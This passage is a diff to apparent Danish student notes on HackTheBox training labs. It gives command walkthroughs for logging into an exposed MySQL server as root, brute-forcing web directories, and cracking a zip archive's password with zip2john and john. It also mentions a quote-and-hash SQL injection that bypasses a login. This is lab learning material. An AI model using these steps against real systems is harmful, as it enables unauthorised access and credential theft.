@@ -232,3 +232,53 @@ Vi med at nmap ip for at finde eventuelle porte(http så der er en hjemmeside), 
 
 
 Her kan der ses at vi kan bi pass adgangskoden hvis vi bruger “ ‘# “, det kan du også se i php koden hvor at username stopper med et ‘ og da vi så bruger et “#” bliver den næste del af koden(altså password delen) ligegyldigt da det bliver til en kommentar.
+
+
+
+
+* Sequel opgave (Lavet med David):
+     * nmap {target_ip}
+       Får åbne porte og versioner.
+     * sudo apt-get update && sudo apt-get install MySQL
+       Kun hvis det ikke allerede er installeret eller opdateret
+     * mysql -h {target_ip} -u root
+     * SHOW DATABASES;
+     * USE htb;
+     * SHOW tables;
+     * SELECT * FROM config;
+       Herunder ligger flaget
+
+   * Oopsie opgave (Lavet med Casper)
+     * nmap {target_ip}
+     * gobuster dir -u {target_ip} -w wordlist
+     * sudo apt update && sudo apt install burb
+     * Stuck her so far da vi ikke kunne komme ind på services på kalilinux
+     * 
+   * Vaccine (Lavet med Casper)
+     * nmap {target_ip}
+       Finder ftp
+     * ftp {target_ip}
+     * ls -a
+     * john -h
+     * zip2john backup.zip > hashes
+     * ls
+     * cat hashes
+     * zip2john backup.zip
+     * john -wordlist=/usr/share/wordlists/rockyou.txt.gz hashes
+       Filen skal extractes da det ikke er rockyou.txt
+     * john -wordlist=Documents/rockyou.txt hashes
+       Extractede den bare til documents
+     * john --show hashes
+     * unzip backup.zip
+     * Læser det hashede password i index.php
+     * echo 'password' hash
+     
+  hackthebox penetration teset gik mest ud på at finde ud af hvor der var et "hul" altså et sted i systemet hvor der var nogle der havde slacket lidt så vi kunne få adgang til det
+  
+### Enumeration 
+Enumeration er udvindingen af data fra et system som senere kan bruges til at få adgang til systemet, dette kan fx. være gennem nmap, gobuster, dirb osv. hvor vi fx. får data omkring hvilke porte der er åbne, hvilket kan bruges til at få adgang til systemet
+### Foothold
+ET foothold, er noget man kan have når man fx. har fået adgang til et system, eller har redskaberne men ikke gør noget ved det. Definationen af det foothold er også "a secure position from which further progress may be made."
+
+### Escalation
+Escalation er når man exploiter, fejl, gamle versioner af programmer osv. for at få adgang til et system
